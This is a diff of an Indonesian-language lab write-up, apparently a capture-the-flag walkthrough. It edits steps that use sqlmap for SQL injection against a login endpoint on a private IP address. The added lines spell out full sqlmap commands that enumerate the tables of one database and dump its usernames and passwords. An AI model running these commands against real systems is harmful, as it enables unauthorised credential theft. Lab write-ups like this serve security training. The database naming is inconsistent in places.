@@ -380,11 +380,11 @@ Menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email
 ![Daftar Nama Database](../../Assets/Images/dbsoutput.png)
 
 **4. Enumeration Tabel (Dumping Table Names)**
-Membongkar brankas _database_ bernama `users` menggunakan flag `--tables` sukses memunculkan tabel bernama `thomas`, `alexas`, dan `johnath`:
+Membongkar brankas _database_ bernama `users` menggunakan flag `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --tables` sukses memunculkan tabel bernama `thomas`, `alexas`, dan `johnath`:
 ![Tabel di Dalam Database Users](../../Assets/Images/insidedbs.png)
 
-**5. Eksekusi Pamungkas: The Final Dump**
-Menyasar spesifik tabel `thomas` menggunakan panahkan pamungkas _flag_ `--dump`, akhirnya data _Username_ dan _Password_ muntah keluar dari _database_:
-![Hasil Dump Username dan Password](../../Assets/Images/injectdatabase.png)
+**5. The Final Dump**
+Menyasar spesifik tabel `ai` menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --dump`, akhirnya data _Username_ dan _Password_ secara mentah keluar dari _database_:
+![Hasil Dump Username dan Password](../../Assets/Images/dumptable.png)
 
 ## Personal Practical
